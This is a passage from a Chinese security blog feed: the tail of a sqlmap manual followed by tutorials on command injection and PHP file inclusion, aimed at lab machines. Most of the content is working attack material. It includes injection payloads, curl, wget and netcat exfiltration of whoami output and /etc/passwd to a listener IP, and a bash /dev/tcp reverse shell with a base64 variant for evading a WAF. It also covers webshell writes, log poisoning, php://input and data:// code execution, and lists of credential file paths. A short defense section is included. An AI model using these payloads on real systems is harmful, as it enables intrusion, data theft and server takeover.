href="#删除注册表值" class="headerlink" title="删除注册表值"></a>删除注册表值</h4><p>参数：–reg-del</p><h4 id="注册表辅助选项"><a href="#注册表辅助选项" class="headerlink" title="注册表辅助选项"></a>注册表辅助选项</h4><p>参数：–reg-key，–reg-value，–reg-data，–reg-type</p><p>需要配合之前三个参数使用，例子：</p><pre class="line-numbers language-none"><code class="language-none">$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap使用手册 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2021/10/27/day31/"/>
      <url>/2021/10/27/day31/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h1><span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>程序员使用脚本语言(比如 PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层。</p><p>如果我们开发的应用，特别是企业级的一些应用需要去调用一些外部程序。当应用需要调用一些外部程序时就会用到一些执行系统命令的函数。应用在调用这些函数执行系统命令的时候，如果<strong>将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞</strong>。</p><p>在 PHP 中可以调用外部程序的常见函数：</p><p>system(args) 有回显</p><p>passthru(args)(有回显)</p><p>exec(args) （回显最后一行-必须 echo 输出）</p><p>shell_exec(args) （无回显-必须输出）</p><p>反引号：`` </p><p>popen(handle,mode)(无回显)</p><p>proc_open(‘cmd’,’flag’,’flag’)（无回显）</p><p>$process = proc_open(‘dir’,$des,$pipes);</p><p>echo stream_get_contents($pipes[1]);</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>继承 Web 服务器程序的权限，去执行系统命令</li><li> 继承 Web 服务器程序的权限，读写文件</li><li>反弹 shell</li><li>控制整个网站</li><li>甚至控制整个服务器</li></ul><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><img src="/2021/10/27/day31/image-20211028172702446.png" alt="image-20211028172702446"></p><p>可以看到ipaddress是外部可控，直接拼接，并且用shell_exec调用系统命令存在命令执行</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p><strong>;(分号)</strong></p><p><strong>命令按照顺序（从左到右）被执行</strong>，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行。</p><p>ping -c 1 127.0.0.1;whoami</p><p>命令执行漏洞可以直接使用&amp;&amp;或者|和管道命令执行其他命令</p><p><strong>| (管道符号)</strong></p><p>通过管道符，可以将一个命令的标准输出管理为另外一个命令的标准输入，当它<strong>失败后，会执行另外一条命令</strong></p><p>ping -c 1 127.0.0.1|whoami</p><p><strong>&amp;(后台任务符号)</strong></p><p>命令按照顺序（从左到右）被执行，<strong>跟分号作用一样</strong>；此符号作用是后台任务符号使 shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作</p><p>ping -c 4 127.0.0.1&amp;cat /etc/passwd&amp;</p><p><strong>&amp;&amp;（逻辑与）</strong></p><p>前后的命令的执行存在逻辑与关系，<strong>只有&amp;&amp;前面的命令执行成功后，它后面的命令才被执行</strong></p><p>ping -c 4 127.0.0.1&amp;&amp;whoami</p><p><strong>||（逻辑或）</strong></p><p>前后命令的执行存在逻辑或关系，<strong>只有||前面的命令执行失败后，它后面的命令才被执行；</strong></p><p>ping -c ||whoami</p><p><strong>`（反引号）</strong></p><p>当一个命令被解析时，它首先会执行反引号之间的操作。</p><p>例如执行 </p><pre class="line-numbers language-none"><code class="language-none">echo `ls -a`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将会首先执行 ls 并捕获其输出信息。然后再将它传递给 echo，并将 ls 的输出结果打印在屏幕上，这被称为命令替换</p><pre class="line-numbers language-none"><code class="language-none">echo `whoami`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>$(command)命令替换</strong></p><p>这是命令替换的不同符号。当反引号被过滤或编码时，可能会更有效。</p><p>ping -c 4 |echo $(whoami)</p><p>有回显的:</p><p>发现命令执行漏洞，如果是回显的情况下，获取系统敏感信息。</p><blockquote><p>win 操作系统</p><p>type c:\windows\win.ini</p><p>linux 操作系统</p><p>cat /etc/passwd</p></blockquote><p>无回显:</p><p>有回显的情况下相对较少，一般在实战环境环境中，无回显的环境较多，证明漏洞存在就需要各种利用外通信技巧</p><h2 id="外通信技巧"><a href="#外通信技巧" class="headerlink" title="外通信技巧"></a>外通信技巧</h2><h3 id="写入webshell后门到网站目录"><a href="#写入webshell后门到网站目录" class="headerlink" title="写入webshell后门到网站目录"></a>写入webshell后门到网站目录</h3><p>如果存在漏洞的页面有 web 服务器，有权限写入，利用 shell 命令写入 webshell后门到网站目录，访问即可获取 webshell</p><pre class="line-numbers language-none"><code class="language-none">|echo "PD9waHAgcGhwaW5mbygpOz8+"|base64 -d &gt;shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028174548579.png" alt="image-20211028174548579"></p><p>ping 后打开shell.php</p><p><img src="/2021/10/27/day31/image-20211028174606951.png" alt="image-20211028174606951"></p><h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>dnslog 是一个显示解析记录的平台，在无回显的情况下，通过访问 dnslog，dnslog会把你访问的子域名的头文件记录下来。</p><p>使用反引号</p><pre class="line-numbers language-none"><code class="language-none">`whoami`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到的用户名再，子域名，再使用 icmp 协议访问 ping 域名</p><pre class="line-numbers language-none"><code class="language-none">| ping `whoami`.ox1cui.dnslog.cn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028184224476.png" alt="image-20211028184224476"></p><p>可以看到有了回显</p><h3 id="burpsuite-burpcollaborator"><a href="#burpsuite-burpcollaborator" class="headerlink" title="burpsuite burpcollaborator"></a>burpsuite burpcollaborator</h3><p>原理和dnslog一样</p><pre class="line-numbers language-none"><code class="language-none">ping -c 4 127.0.0.1| ping -c 2 `whoami`.gscy64kw4vcfn1jetgvogthnpev4jt.burpcollaborator.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028184557914.png" alt="image-20211028184557914"></p><p>可以看到也出了数据</p><h3 id="利用日志"><a href="#利用日志" class="headerlink" title="利用日志"></a>利用日志</h3><p>利用 HTTP 协议，访问 WEB 中间件时，iis 或者 apache 或者小型服务，都存在访问日志。</p><p>在 kali 上开启 python 的小型服务器。再用 curl 协议访问远程服务器ip 的 80 端口，再到 kali 的终端查看记录即可。</p><pre class="line-numbers language-none"><code class="language-none">使用 curl 命令ping -c 4 ||curl http://10.163.194.45/?`whoami`使用 wget 命令ping -c 4 ||wget http://10.163.194.45/?`whoami`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028184822163.png" alt="image-20211028184822163"></p><p><img src="/2021/10/27/day31/image-20211028185440496.png" alt="image-20211028185440496"></p><h3 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h3><p>如果目标系统存在有 netcat (ubuntu 系统都会存在)。使用命令读取文件传递到远程服务器上</p><pre class="line-numbers language-none"><code class="language-none">远程服务器监听命令nc -lp 9999 &gt;passwd本地执行命令nc 10.163.193.76 9999 &lt;/etc/passwd会在查看远程服务器生成 passwd 文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028190442147.png" alt="image-20211028190442147"></p><h2 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h2><p>在执行命令漏洞，一般的利用方式是执行反弹 shell，再进行其他的操作。</p><p>执行反弹 shell 的命令有许多。</p><p>反弹 shell 因为是从受害者，反向连接远程服务器，请求是从内部到外部，所以防火墙是不会进行拦截。</p><pre class="line-numbers language-none"><code class="language-none">远程服务器 nc 监听命令nc -vlnp 8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028191508214.png" alt="image-20211028191508214"></p><p>受害者反弹 shell 命令，每种语言都有 sock 连接命令，可以根据不同的环境，选择合适的命令。</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/10.163.194.45/8080 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用bash shell 执行</p><pre class="line-numbers language-none"><code class="language-none">||/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.163.194.45/8080 0&gt;&amp;1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/27/day31/image-20211028191624957.png" alt="image-20211028191624957"></p><p><img src="/2021/10/27/day31/image-20211028191701451.png" alt="image-20211028191701451"></p><p><img src="/2021/10/27/day31/image-20211028192230970.png" alt="image-20211028192230970"></p><p>可以看到拿到了shell</p><p>如果有 waf 进行连接，可以把语句进行 base64 加密后，因为加密后的字符串没有触发拦截规则，再利用 shell 命令再进行解码。</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.0.103/8080 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64 编码后</p><pre class="line-numbers language-none"><code class="language-none">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzgwODAgMD4mMQ==<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>受害者执行</p><pre class="line-numbers language-none"><code class="language-none">echo"YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTMzLzgwODAgMD4mMQ=="|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li><p>不执行外部的应用程序或命令</p><p>尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行 system、eval 等命令执行功能的函数前，要确认参数内容。</p></li><li><p>使用 escapeshellarg 函数处理相关参数</p><p>escapeshellarg 函数会将用户引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”，双引号“””会被转义为“””，分号“;”会被转义为“;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。</p></li><li><p>使用 safe_mode_exec_dir 执行可执行的文件路径</p><p>将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir 指定的目录中才会允许执行，否则执行将失败。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2021/10/20/day30/"/>
      <url>/2021/10/20/day30/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><span id="more"></span><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>程序在引用文件的时，引用的文件名，用户可控的情况，传入的文件名没有经过合理的校验或校验不严，从而操作了预想之外的文件，就有可能导致文件泄漏和恶意的代码注入。</p><p>程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这重文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。</p><p>几乎所有脚本语言都会提供文件包含的功能，但文件包含漏洞在 PHP WebApplication 中居多,而在 JSP、ASP、ASP.NET 程序中却非常少，甚至没有，这是有些语言设计的弊端。在 PHP 中经常出现包含漏洞，但这并不意味这其他语言不存在。</p><h2 id="常见的文件包含函数"><a href="#常见的文件包含函数" class="headerlink" title="常见的文件包含函数"></a>常见的文件包含函数</h2><p>include()：执行到 include 时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</p><p>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</p><p>include_once()和 require_once()：若文件中代码已被包含则不会再次包含</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><pre class="line-numbers language-none"><code class="language-none">cd /var/www/html/06/vul/fileincludecat fileinclude.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211024175323997.png" alt="image-20211024175323997"></p><p>我们把源码拿出来看 清晰一点</p><p><img src="/2021/10/20/day30/image-20211024175349393.png" alt="image-20211024175349393"></p><p>$_GET[‘filename’] 接收客户端传的参数，没有任何过滤，然后带入到 include 函数中，include 包含这个文件，引入到当前文件中，因此会造成文件包含漏洞。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>文件包含漏洞，需要引入上传的文件到网站目录，或是服务器内部的文件，而且权限是可读，才能引入进来，或远程包含进来，但是需要条件。</p><h2 id="文件包含-etc-passwd"><a href="#文件包含-etc-passwd" class="headerlink" title="文件包含 /etc/passwd"></a>文件包含 /etc/passwd</h2><p>这是Linux中一个比较敏感的文件</p><p><img src="/2021/10/20/day30/image-20211024175805618.png" alt="image-20211024175805618"></p><h2 id="文件包含图片"><a href="#文件包含图片" class="headerlink" title="文件包含图片"></a>文件包含图片</h2><p>寻找网站上传点，把 php 恶意代码文件改成 jpg 上传到网站上，本地包含引入恶意代码，当文件被引入后代码就被执行。</p><p><img src="/2021/10/20/day30/image-20211024180029604.png" alt="image-20211024180029604"></p><p>1.jpg</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211024180138015.png" alt="image-20211024180138015"></p><h2 id="包含日志文件getshell"><a href="#包含日志文件getshell" class="headerlink" title="包含日志文件getshell"></a>包含日志文件getshell</h2><p>中间件例如 iis 、apache、nginx 这些 web 中间件，都会记录访问日志，如果访问日志中或错误日志中，存在有 php 代码，也可以引入到文件包含中。如果日志有 php 恶意代码，也可导致 getshell。</p><p>linux 默认的 apache 日志文件路径是</p><p>访问日志</p><p>/var/log/apache2/access.log</p><p>错误日志</p><p>/var/log/apache2/error.log</p><p>把文件日志包含进来即可</p><p><img src="/2021/10/20/day30/image-20211024181734567.png" alt="image-20211024181734567"></p><p>抓包写入php代码 send</p><p><img src="/2021/10/20/day30/image-20211024181831205.png" alt="image-20211024181831205"></p><p><img src="/2021/10/20/day30/image-20211024181857838.png" alt="image-20211024181857838"></p><p>但是在linux下我们没有权限包含日志文件，需要root权限，但是php权限是www-data，我们在windows下可以做到此操作</p><p>所以我们在phpstudy上新建一个网站，在根目录中写</p><p><img src="/2021/10/20/day30/image-20211024180755718.png" alt="image-20211024180755718"></p><p><img src="/2021/10/20/day30/image-20211024180805215.png" alt="image-20211024180805215"></p><p>还是同样的操作</p><p><img src="/2021/10/20/day30/image-20211024182425327.png" alt="image-20211024182425327"></p><p>我们在apache中找到日志</p><p><img src="/2021/10/20/day30/image-20211024182454722.png" alt="image-20211024182454722"></p><p><img src="/2021/10/20/day30/image-20211024182504581.png" alt="image-20211024182504581"></p><p>可以看到php代码被记录了下来</p><p>包含日志文件 找到此日志路径</p><p><img src="/2021/10/20/day30/image-20211024183105183.png" alt="image-20211024183105183"></p><p>包含日志文件发现php代码被执行了</p><p><img src="/2021/10/20/day30/image-20211024183031702.png" alt="image-20211024183031702"></p><h2 id="包含环境变量getshell"><a href="#包含环境变量getshell" class="headerlink" title="包含环境变量getshell"></a>包含环境变量getshell</h2><p>/proc/self/environ 这个文件保存了一些系统的变量</p><p><img src="/2021/10/20/day30/image-20211024184219595.png" alt="image-20211024184219595"></p><p>我们抓包修改user-agent，写入php代码</p><p><img src="/2021/10/20/day30/image-20211024184107609.png" alt="image-20211024184107609"></p><p>如果权限足够就会把代码写入到上面那个文件，包含此文件即可执行php代码</p><h2 id="phpinfo文件包含临时文件"><a href="#phpinfo文件包含临时文件" class="headerlink" title="phpinfo文件包含临时文件"></a>phpinfo文件包含临时文件</h2><p>原理: 利用 php post 上传文件产生临时文件，phpinfo()读临时文件的路径和名字，</p><p>本地包含漏洞生成 一句话后门</p><p>1.php 在解析 multipart/form-data 请求时，会创建临时文件，并写入上传内容，脚本执行后即删除</p><p>2.phpinfo 可以输出$_FILE 信息</p><p>3.通过多种方式争取时间，在临时文件删除前进行执行包含</p><p>1）通过在数据报文中加入大量的垃圾数据，似 phpinfo 页面过大，导致 phpinfo页面过大，导致 php 输出进入流式输出，并不一次输出完毕</p><p>2）通过大量请求来延迟 php 脚本的执行速度php post 方式上传任意文件，服务器都会创建临时文件来保存文件内容。在 HTTP 协议中为了方便进行文件传输，规定了一种基于表单的 HTML 文件传输方法</p><p>其中要确保上传表单的属性是 enctype=”multipart/form-data”</p><p>其中 PHP 引擎对 enctype=”multipart/form-data”这种请求的处理过程如下：</p><p>1、请求到达；</p><p>2、创建临时文件，并写入上传文件的内容；</p><p>3、调用相应 PHP 脚本进行处理，如校验名称、大小等；</p><p>4、删除临时文件。</p><p>PHP 引擎会首先将文件内容保存到临时文件，然后进行相应的操作。临时文件的名称是 php+随机字符 。$_FILES 信息，包括临时文件路径、名称在 PHP 中，有超全局变量$_FILES,保存上传文件的信息，包括文件名、类型、临时文件名、错误代号、大小把文件上传到 phpinfo 获取临时文件路径</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>写个上传表单，让文件上传到我们写的phpinfo.php</p><p><img src="/2021/10/20/day30/image-20211024185328114.png" alt="image-20211024185328114"></p><p>上传文件后，phpinfo创建了一个临时文件</p><p><img src="/2021/10/20/day30/image-20211024185239634.png" alt="image-20211024185239634"></p><p>这个临时文件在上传过后就会被删除，所以我们在目录下找不到此文件</p><p>我们利用脚本修改利用的文件和路径</p><pre class="line-numbers language-none"><code class="language-none">脚本就不放了<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行成功后回在/tmp下建立一个g的文件，</p><p><img src="/2021/10/20/day30/image-20211024193928068.png" alt="image-20211024193928068"></p><p>g文件已经创建了</p><p><img src="/2021/10/20/day30/image-20211024194041896.png" alt="image-20211024194041896"></p><p>包含此文件</p><p><img src="/2021/10/20/day30/image-20211024194635206.png" alt="image-20211024194635206"></p><p>这里1也可以执行命令</p><p><img src="/2021/10/20/day30/image-20211024194725911.png" alt="image-20211024194725911"></p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>file:// — 访问本地文件系统</p><p>http:// — 访问 HTTP(s) 网址</p><p>ftp:// — 访问 FTP(s) URLs</p><p>php:// — 访问各个输入/输出流（I/O streams）</p><p>zlib:// — 压缩流</p><p>data:// — 数据（RFC 2397）</p><p>glob:// — 查找匹配的文件路径模式</p><p>phar:// — PHP 归档</p><p>ssh2:// — Secure Shell 2</p><p>rar:// — RAR</p><p>ogg:// — 音频流</p><p>expect:// — 处理交互式的流</p><h3 id="php-ini参数设置"><a href="#php-ini参数设置" class="headerlink" title="php.ini参数设置"></a>php.ini参数设置</h3><p>在 php.ini 里有两个重要的参数 allow_url_fopen、allow_url_include。</p><p>allow_url_fopen:默认值是 ON。允许 url 里的封装协议访问文件；</p><p>allow_url_include:默认值是 OFF。不允许包含 url 里的封装协议包含文件；</p><p>各协议的利用条件和方法：</p><p><img src="/2021/10/20/day30/image-20211026170242776.png" alt="image-20211026170242776"></p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input 可以访问请求的原始数据的只读流，将 post 请求的数据当作 php 代码执行。当传入的参数作为文件名打开时，可以将参数设为 php://input,同时 post想设置的文件内容，php 执行时会将 post 内容当作文件内容。</p><p>注：当 enctype=”multipart/form-data”，php://input 是无效的。php.ini 条件是 allow_url_fopen =ON allow_url_include=ON</p><p><img src="/2021/10/20/day30/image-20211026171121497.png" alt="image-20211026171121497"></p><p>设置请求为 post 请求，在正文输入 php 代码&lt;?php phpinfo();?&gt;提交即可允许</p><p><img src="/2021/10/20/day30/image-20211026171144602.png" alt="image-20211026171144602"></p><p>看到php代码被执行了</p><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>访问本地文件，在本地包含漏洞里可以使用 file 协议，使用 file 协议可以读取本地文件</p><pre class="line-numbers language-none"><code class="language-none">file:///etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211026171448143.png" alt="image-20211026171448143"></p><p>读取相对路径的文件</p><p><img src="/2021/10/20/day30/image-20211026171810708.png" alt="image-20211026171810708"></p><p><img src="/2021/10/20/day30/image-20211026171819347.png" alt="image-20211026171819347"></p><h3 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h3><p>php:// 用于访问各个输入/输出流（I/O streams），经常使用的是 php://filter 和php://input</p><p>php://filter 用于读取源码；php://input 用于执行 php 代码。</p><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST 请求中访问 POST 的 data 部分，在 enctype=”multipart/form-data” 的时候 php://input 是无效的。</td></tr><tr><td>php://output</td><td>写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td></td><td></td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和sys_get_temp_dir() 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类 似 readfile()、file() 和file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><p>php://filter 参数详解</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td></tr><tr><td>write=&lt;写链的筛选列表&gt;</td><td>该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 read= 或 write= 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table><p>可用的过滤器列表</p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于 str_rot13()，rot13 变换</td></tr><tr><td>string.toupper</td><td>等同于 strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于 strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于 strip_tags()，去除 html、PHP 语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp;convert.base64-decode</td><td>等同于 base64_encode()和base64_decode()，base64 编码解码</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><p>使用伪协议以base64编码过滤方式读取文件源码</p><p><img src="/2021/10/20/day30/image-20211026173918910.png" alt="image-20211026173918910"></p><h3 id="phar-、zip-、bzip2-、zlib"><a href="#phar-、zip-、bzip2-、zlib" class="headerlink" title="phar://、zip://、bzip2://、zlib://"></a>phar://、zip://、bzip2://、zlib://</h3><p>用于读取压缩文件，zip:// 、 bzip2:// 、 zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</p><p>1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（ #\编码为%23）</p><p><img src="/2021/10/20/day30/image-20211027131327365.png" alt="image-20211027131327365"></p><p>这里不知道为啥没读出来</p><p><img src="/2021/10/20/day30/image-20211027131244680.png" alt="image-20211027131244680"></p><p>但是直接?file=1.zip可以解析</p><p><img src="/2021/10/20/day30/image-20211027131336372.png" alt="image-20211027131336372"></p><p>2、compress.bzip2://file.bz2</p><p><a href="http://127.0.0.1/include.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg">http://127.0.0.1/include.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</a></p><p><a href="http://127.0.0.1/include.php?file=compress.bzip2://./file.jpg">http://127.0.0.1/include.php?file=compress.bzip2://./file.jpg</a></p><p>3、compress.zlib://file.gz</p><p><a href="http://127.0.0.1/include.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg">http://127.0.0.1/include.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</a></p><p><a href="http://127.0.0.1/include.php?file=compress.zlib://./file.jpg">http://127.0.0.1/include.php?file=compress.zlib://./file.jpg</a></p><p>4、phar://</p><p><a href="http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</a></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>1.data://text/plain</p><pre class="line-numbers language-none"><code class="language-none">http://10.163.193.76/lfi.php?file=data://text/plain,%3C?php%20phpinfo();?%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211027132944458.png" alt="image-20211027132944458"></p><p>2.data://text/plain;base64</p><pre class="line-numbers language-none"><code class="language-none">http://10.163.193.76/lfi.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211027133831321.png" alt="image-20211027133831321"></p><h2 id="文件包含常用路径"><a href="#文件包含常用路径" class="headerlink" title="文件包含常用路径"></a>文件包含常用路径</h2><p>包含日志文件 getshell</p><p>/usr/local/apache2/logs/access_log</p><p>/logs/access_log</p><p>/etc/httpd/logs/access_log</p><p>/var/log/httpd/access_log</p><p>读取网站配置文件</p><p>dedecms 数据库配置文件 data/common.inc.php,</p><p>discuz 全局配置文件 config/config_global.php,</p><p>phpcms 配置文件 caches/configs/database.php</p><p>phpwind 配置文件 conf/database.php</p><p>wordpress 配置文件 wp-config.php</p><p>包含系统配置文件</p><p>windows</p><p>C:/boot.ini//查看系统版本</p><p>C:/Windows/System32/inetsrv/MetaBase.xml//IIS 配置文件</p><p>C:/Windows/repairsam//存储系统初次安装的密码</p><p>C:/Program Files/mysql/my.ini//Mysql 配置</p><p>C:/Program Files/mysql/data/mysql/user.MYD//Mysql root</p><p>C:/Windows/php.ini//php 配置信息</p><p>C:/Windows/my.ini//Mysql 配置信息</p><p>linux</p><p>/root/.ssh/authorized_keys</p><p>/root/.ssh/id_rsa</p><p>/root/.ssh/id_ras.keystore</p><p>/root/.ssh/known_hosts</p><p>/etc/passwd</p><p>/etc/shadow</p><p>/etc/my.cnf/etc/httpd/conf/httpd.conf</p><p>/root/.bash_history</p><p>/root/.mysql_history</p><p>/proc/self/fd/fd[0-9]*(文件标识符)</p><p>/proc/mounts</p><p>/porc/config.gz</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>当远程文件开启时，可以包含远程文件到本地执行。当 allow_url_fopen=On，allow_url_include=ON 两个条件同时为 On 允许远程包含文件。</p><pre class="line-numbers language-none"><code class="language-none">http://10.163.193.76/lfi.php?file=http://10.163.193.76/shell.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/10/20/day30/image-20211027134144483.png" alt="image-20211027134144483"></p><p><img src="/2021/10/20/day30/image-20211027134224739.png" alt="image-20211027134224739"></p><h2 id="文件包含-00截断"><a href="#文件包含-00截断" class="headerlink" title="文件包含%00截断"></a>文件包含%00截断</h2><p>文件包含截断攻击，在 php 版本小于 5.3.4 允许使用%00 截断，在使用 include等文件包含函数，可以截断文件名，截断会受 gpc 影响，如果 gpc 为 On 时，%00会被转以成\0 截断会失败。</p><p>当前我们是5.2.17 gpc=off</p><p><img 